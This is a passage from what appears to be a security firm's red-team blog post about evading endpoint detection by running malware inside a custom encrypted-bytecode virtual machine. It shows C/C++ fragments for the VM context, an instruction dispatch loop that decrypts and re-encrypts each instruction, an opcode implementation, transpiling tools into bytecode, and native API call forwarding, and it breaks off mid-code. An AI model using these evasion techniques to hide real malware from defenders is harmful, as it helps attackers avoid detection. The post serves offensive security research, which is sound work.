<p class="wp-block-paragraph">The virtual machine resembles a virtual CPU, implementing all the available opcodes. Furthermore, the available registers, CPU flags, and stack are part of the virtual machine object. Lastly, the virtual machine holds a pointer to the bytecode buffer necessary for execution. An added benefit of implementing the virtual machine is that the real stack is also abstracted away. Heuristics that attempt to spot malicious behavior from the stack will not succeed.</p>



<figure class="wp-block-embed is-type-rich is-provider-embed-handler wp-block-embed-embed-handler"><div class="wp-block-embed__wrapper">
<div style="tab-size: 8" id="gist132181980" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        
<div class="js-gist-file-update-container js-task-list-container">
      <div id="file-context-h" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="context.h content, created by fox-srt on 07:28AM on August 22, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  
  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <span>
      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
    </span>


  <div data-view-component="true" class="flash-action">        <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/" data-view-component="true" class="btn-sm btn">    Show hidden characters
</a>
</div>
</div>

  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
</span>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="context.h">
        <tbody><tr>
          <td id="file-context-h-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-context-h-LC1" class="blob-code blob-code-inner js-file-line">struct Context {</td>
        </tr>
        <tr>
          <td id="file-context-h-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-context-h-LC2" class="blob-code blob-code-inner js-file-line">    uint32_t            ip;                 // Instruction pointer</td>
        </tr>
        <tr>
          <td id="file-context-h-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-context-h-LC3" class="blob-code blob-code-inner js-file-line">    uint8_t             flags;              // CPU flags to be manipulated by opcodes</td>
        </tr>
        <tr>
          <td id="file-context-h-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-context-h-LC4" class="blob-code blob-code-inner js-file-line">    Register            registers[17];      // General Purpose Registers (rax, … r15 and gs)</td>
        </tr>
        <tr>
          <td id="file-context-h-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-context-h-LC5" class="blob-code blob-code-inner js-file-line">    Instruction*        instructions;       // A pointer to the start of the bytecode buffer</td>
        </tr>
        <tr>
          <td id="file-context-h-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-context-h-LC6" class="blob-code blob-code-inner js-file-line">    uint8_t             stack[STACK_SIZE];  // The virtual machine stack</td>
        </tr>
        <tr>
          <td id="file-context-h-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-context-h-LC7" class="blob-code blob-code-inner js-file-line">};</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>

</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/fox-srt/aa0fd9378a7d0e6594ee0d046c2ccef6/raw/0ef1cf0905d48e2eb08b8edde847fce9fabfb847/context.h" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/fox-srt/aa0fd9378a7d0e6594ee0d046c2ccef6#file-context-h" class="Link--inTextBlock">
          context.h
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

</div></figure>



<p class="wp-block-paragraph">Functions to initialize the virtual machine context, to obtain the current instruction, and to load and store values based on the instruction operands were created to aid in the implementation of opcodes within the virtual machine.</p>



<p class="wp-block-paragraph">Once initialized, the virtual machine can enter its dispatch loop. This loop consists of obtaining the current instruction and executing the opcode identified by the opcode field in the instruction object. The instruction is decrypted before execution and is encrypted after. A dispatch function could be implemented as follows:</p>



<figure class="wp-block-embed is-type-rich is-provider-embed-handler wp-block-embed-embed-handler"><div class="wp-block-embed__wrapper">
<div style="tab-size: 8" id="gist132181949" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        
<div class="js-gist-file-update-container js-task-list-container">
      <div id="file-dispatch-cpp" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="dispatch.cpp content, created by fox-srt on 07:25AM on August 22, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  
  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <span>
      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
    </span>


  <div data-view-component="true" class="flash-action">        <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/" data-view-component="true" class="btn-sm btn">    Show hidden characters
</a>
</div>
</div>

  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
</span>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="dispatch.cpp">
        <tbody><tr>
          <td id="file-dispatch-cpp-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-dispatch-cpp-LC1" class="blob-code blob-code-inner js-file-line">void dispatch_instruction(Context* vm) {</td>
        </tr>
        <tr>
          <td id="file-dispatch-cpp-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-dispatch-cpp-LC2" class="blob-code blob-code-inner js-file-line">    uint32_t ip = vm-&gt;ip;</td>
        </tr>
        <tr>
          <td id="file-dispatch-cpp-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-dispatch-cpp-LC3" class="blob-code blob-code-inner js-file-line">    decrypt_instruction(vm, ip);</td>
        </tr>
        <tr>
          <td id="file-dispatch-cpp-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-dispatch-cpp-LC4" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-dispatch-cpp-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-dispatch-cpp-LC5" class="blob-code blob-code-inner js-file-line">    switch (vm-&gt;instructions[ip].opcode) {</td>
        </tr>
        <tr>
          <td id="file-dispatch-cpp-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-dispatch-cpp-LC6" class="blob-code blob-code-inner js-file-line">    case Opcode::ADD: opcode_add(vm); next_instruction(vm); break;</td>
        </tr>
        <tr>
          <td id="file-dispatch-cpp-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-dispatch-cpp-LC7" class="blob-code blob-code-inner js-file-line">    case Opcode::AND: opcode_and(vm); next_instruction(vm); break;</td>
        </tr>
        <tr>
          <td id="file-dispatch-cpp-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-dispatch-cpp-LC8" class="blob-code blob-code-inner js-file-line">    case Opcode::BT:  opcode_bt(vm);  next_instruction(vm); break;</td>
        </tr>
        <tr>
          <td id="file-dispatch-cpp-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-dispatch-cpp-LC9" class="blob-code blob-code-inner js-file-line">    …</td>
        </tr>
        <tr>
          <td id="file-dispatch-cpp-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-dispatch-cpp-LC10" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-dispatch-cpp-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-dispatch-cpp-LC11" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-dispatch-cpp-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-dispatch-cpp-LC12" class="blob-code blob-code-inner js-file-line">    encrypt_instruction(vm, ip);</td>
        </tr>
        <tr>
          <td id="file-dispatch-cpp-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-dispatch-cpp-LC13" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>

</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/fox-srt/b8b3ba24a09cde19973f69d85a1879a8/raw/e668ee989012f33a4f5c843e7f4fb942457201a5/dispatch.cpp" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/fox-srt/b8b3ba24a09cde19973f69d85a1879a8#file-dispatch-cpp" class="Link--inTextBlock">
          dispatch.cpp
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

</div></figure>



<p class="wp-block-paragraph">An attentive reader may have noticed the construction of the temporary variable <code>ip</code>, which is used in further operations. This originates from the fact that any instructions modifying the instruction pointer, like <code>jcc</code>, <code>call</code>, and <code>ret</code>, will result in a modified instruction pointer when the opcode is finished. Therefore, the instruction pointer can no longer be used to re-encrypt the original instruction that was executed.</p>



<h2 class="wp-block-heading has-medium-font-size"><strong>Implementation of a Basic Opcode</strong></h2>



<p class="wp-block-paragraph">The following function implements the bit test (<code>bt</code>) opcode<sup data-fn="3e7aeb95-4e7c-44d8-8927-61a261e8050f" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#3e7aeb95-4e7c-44d8-8927-61a261e8050f" id="3e7aeb95-4e7c-44d8-8927-61a261e8050f-link">11</a></sup>:</p>



<figure class="wp-block-embed is-type-rich is-provider-embed-handler wp-block-embed-embed-handler"><div class="wp-block-embed__wrapper">
<div style="tab-size: 8" id="gist132181995" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        
<div class="js-gist-file-update-container js-task-list-container">
      <div id="file-opcode_bt-cpp" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="opcode_bt.cpp content, created by fox-srt on 07:29AM on August 22, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  
  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <span>
      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
    </span>


  <div data-view-component="true" class="flash-action">        <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/" data-view-component="true" class="btn-sm btn">    Show hidden characters
</a>
</div>
</div>

  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
</span>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="opcode_bt.cpp">
        <tbody><tr>
          <td id="file-opcode_bt-cpp-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-opcode_bt-cpp-LC1" class="blob-code blob-code-inner js-file-line">void opcode_bt(Context* vm) {</td>
        </tr>
        <tr>
          <td id="file-opcode_bt-cpp-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-opcode_bt-cpp-LC2" class="blob-code blob-code-inner js-file-line">	// get the current instruction from the context</td>
        </tr>
        <tr>
          <td id="file-opcode_bt-cpp-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-opcode_bt-cpp-LC3" class="blob-code blob-code-inner js-file-line">	Instruction* i = get_current_instruction(vm);</td>
        </tr>
        <tr>
          <td id="file-opcode_bt-cpp-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-opcode_bt-cpp-LC4" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-opcode_bt-cpp-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-opcode_bt-cpp-LC5" class="blob-code blob-code-inner js-file-line">	// load the value and the bit to test</td>
        </tr>
        <tr>
          <td id="file-opcode_bt-cpp-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-opcode_bt-cpp-LC6" class="blob-code blob-code-inner js-file-line">	Value dst = fetch_value(vm, i-&gt;lparam_type, i-&gt;lparam);</td>
        </tr>
        <tr>
          <td id="file-opcode_bt-cpp-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-opcode_bt-cpp-LC7" class="blob-code blob-code-inner js-file-line">	Value src = fetch_value(vm, i-&gt;rparam_type, i-&gt;rparam);</td>
        </tr>
        <tr>
          <td id="file-opcode_bt-cpp-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-opcode_bt-cpp-LC8" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-opcode_bt-cpp-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-opcode_bt-cpp-LC9" class="blob-code blob-code-inner js-file-line">	// get the size in bits of the value to check</td>
        </tr>
        <tr>
          <td id="file-opcode_bt-cpp-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-opcode_bt-cpp-LC10" class="blob-code blob-code-inner js-file-line">	size_t size = get_operand_size(i-&gt;lparam_type, i-&gt;lparam);</td>
        </tr>
        <tr>
          <td id="file-opcode_bt-cpp-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-opcode_bt-cpp-LC11" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-opcode_bt-cpp-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-opcode_bt-cpp-LC12" class="blob-code blob-code-inner js-file-line">	// set the carry flag to the result of the bit test</td>
        </tr>
        <tr>
          <td id="file-opcode_bt-cpp-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-opcode_bt-cpp-LC13" class="blob-code blob-code-inner js-file-line">	switch (size) {</td>
        </tr>
        <tr>
          <td id="file-opcode_bt-cpp-L14" class="blob-num js-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-opcode_bt-cpp-LC14" class="blob-code blob-code-inner js-file-line">	case 8:	 vm-&gt;flags.cf = (dst.u8 &amp; (1 &lt;&lt; src.u8))      != 0; break;</td>
        </tr>
        <tr>
          <td id="file-opcode_bt-cpp-L15" class="blob-num js-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-opcode_bt-cpp-LC15" class="blob-code blob-code-inner js-file-line">	case 16: vm-&gt;flags.cf = (dst.u16 &amp; (1 &lt;&lt; src.u16))    != 0; break;</td>
        </tr>
        <tr>
          <td id="file-opcode_bt-cpp-L16" class="blob-num js-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-opcode_bt-cpp-LC16" class="blob-code blob-code-inner js-file-line">	case 32: vm-&gt;flags.cf = (dst.u32 &amp; (1 &lt;&lt; src.u32))    != 0; break;</td>
        </tr>
        <tr>
          <td id="file-opcode_bt-cpp-L17" class="blob-num js-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-opcode_bt-cpp-LC17" class="blob-code blob-code-inner js-file-line">	case 64: vm-&gt;flags.cf = (dst.u64 &amp; (1ull &lt;&lt; src.u64)) != 0; break;</td>
        </tr>
        <tr>
          <td id="file-opcode_bt-cpp-L18" class="blob-num js-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-opcode_bt-cpp-LC18" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="file-opcode_bt-cpp-L19" class="blob-num js-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-opcode_bt-cpp-LC19" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>

</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/fox-srt/468df043877b48ae0921f5bcc65b6454/raw/03df21978f32f86204f21b6b29f263f5991acffe/opcode_bt.cpp" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/fox-srt/468df043877b48ae0921f5bcc65b6454#file-opcode_bt-cpp" class="Link--inTextBlock">
          opcode_bt.cpp
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

</div></figure>



<h2 class="wp-block-heading has-medium-font-size"><strong>Improving the Bytecode Process: Transpiling</strong></h2>



<p class="wp-block-paragraph">Initially, all bytecode created to execute in the virtual environment was written in assembly by hand. This provided the control needed to make sure specific opcodes and operand types were used, and as a test a PE loader was implemented in bytecode. As this limitation came at a major cost in development time and flexibility, a new method of generating bytecode was used: compiling and transpiling of C/C++ programs. This was chosen over using output directly from the assembler, as parsing these text files proved to be cumbersome and error-prone. Instead, the resulting linked binary was fed to a disassembler.</p>



<p class="wp-block-paragraph">The disassembling of a binary is performed using the iced-x86 library<sup data-fn="ad0bb794-316c-4597-88f6-ecbc4030e79c" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#ad0bb794-316c-4597-88f6-ecbc4030e79c" id="ad0bb794-316c-4597-88f6-ecbc4030e79c-link">12</a></sup>. This library allows for the conversion of x86 instructions to the custom format -described in the earlier section: <em>The Anatomy of an Instruction</em>– by checking the opcode of the instruction, the types of operand(s) and its value(s). Eventually, once all the x86 instructions are converted, the now transpiled bytecode can be interpreted by the virtual machine.</p>


<div class="wp-block-image">
<figure class="aligncenter size-large"><a href="https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/transpiling.png?ssl=1"><img data-recalc-dims="1" decoding="async" width="800" height="100" data-attachment-id="4851" data-permalink="https://blog.fox-it.com/transpiling/" data-orig-file="https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/transpiling.png?fit=1813%2C227&amp;ssl=1" data-orig-size="1813,227" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="transpiling" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/transpiling.png?fit=300%2C38&amp;ssl=1" data-large-file="https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/transpiling.png?fit=800%2C100&amp;ssl=1" src="https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/transpiling.png?resize=800%2C100&amp;ssl=1" alt="" class="wp-image-4851"></a><figcaption class="wp-element-caption"><em>The bytecode generation process from source code to eventual bytecode.</em></figcaption></figure>
</div>


<p class="wp-block-paragraph">The implementation of the transpiler instantly enabled us to support a large amount of existing tools, and made writing new tools easier. Most Position-independent Code (PIC)<sup data-fn="54e90f32-844d-4c9a-b618-0c30b0f819ea" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#54e90f32-844d-4c9a-b618-0c30b0f819ea" id="54e90f32-844d-4c9a-b618-0c30b0f819ea-link">13</a></sup> tools that compile from C/C++, including some BOFs<sup data-fn="21563ac9-99ea-4aca-a16e-513b183fc1ad" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#21563ac9-99ea-4aca-a16e-513b183fc1ad" id="21563ac9-99ea-4aca-a16e-513b183fc1ad-link">14</a></sup>, can also be ported to execute on the virtual machine with relative ease.</p>



<h2 class="wp-block-heading has-medium-font-size"><strong>Limitations to Bytecode Implementation</strong></h2>



<p class="wp-block-paragraph">One of the limitations of the virtual machine implementation is shared with that of the bytecode. PIC must be created in order to generate valid bytecode that executes on the VM. In practice, this means that everything is relative to the current instruction pointer, and no references to other libraries or parts of other sections can exist:</p>



<ul class="wp-block-list">
<li>No static variables;</li>



<li>No global variables;</li>



<li>No strings;</li>



<li>No static dependencies on libraries.</li>
</ul>



<h2 class="wp-block-heading has-medium-font-size"><strong>Supporting Native API Calls</strong></h2>



<p class="wp-block-paragraph">To allow interfacing with the OS layer, bytecode must be able to perform native API calls. A translation layer must exist between the bytecode and native environment. The <code>call</code> instruction is used by compilers to invoke APIs, requiring the virtual machine’s <code>call</code> implementation to support this translation. Unfortunately, once a <code>call</code> instruction is encountered, no information is known to the virtual machine related to the number of arguments that must be forwarded. To resolve this problem, the bytecode can prepend the number of arguments when calling an API, giving the virtual machine layer enough information to translate the call into native execution. To programmatically perform this task, variadic arguments in C++ templates can be used to automatically deduce the amount of arguments passed:</p>



<figure class="wp-block-embed is-type-rich is-provider-embed-handler wp-block-embed-embed-handler"><div class="wp-block-embed__wrapper">
<div style="tab-size: 8" id="gist132182040" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        
<div class="js-gist-file-update-container js-task-list-container">
      <div id="file-apicall-cpp" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="apicall.cpp content, created by fox-srt on 07:31AM on August 22, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  
  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <span>
      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
    </span>


  <div data-view-component="true" class="flash-action">        <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/" data-view-component="true" class="btn-sm btn">    Show hidden characters
</a>
</div>
</div>

  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
</span>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="apicall.cpp">
        <tbody><tr>
          <td id="file-apicall-cpp-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-apicall-cpp-LC1" class="blob-code blob-code-inner js-file-line">template &lt;typename Ret, typename … Args&gt;</td>
        </tr>
        <tr>
          <td id="file-apicall-cpp-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-apicall-cpp-LC2" class="blob-code blob-code-inner js-file-line">struct apicall&lt;Ret(Args…)&gt; {</td>
        </tr>
        <tr>
          <td id="file-apicall-cpp-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-apicall-cpp-LC3" class="blob-code blob-code-inner js-file-line">	static decltype(auto) call(const void* target, Args … args) {</td>
        </tr>
        <tr>
          <td id="file-apicall-cpp-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-apicall-cpp-LC4" class="blob-code blob-code-inner js-file-line">		constexpr size_t nargs = sizeof…(Args);       // Calculate the number of arguments passed</td>
        </tr>
        <tr>
          <td id="file-apicall-cpp-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-apicall-cpp-LC5" class="blob-code blob-code-inner js-file-line">		using f = Ret(__stdcall*)(size_t, Args…);     // Define the signature of the API to call</td>
        </tr>
        <tr>
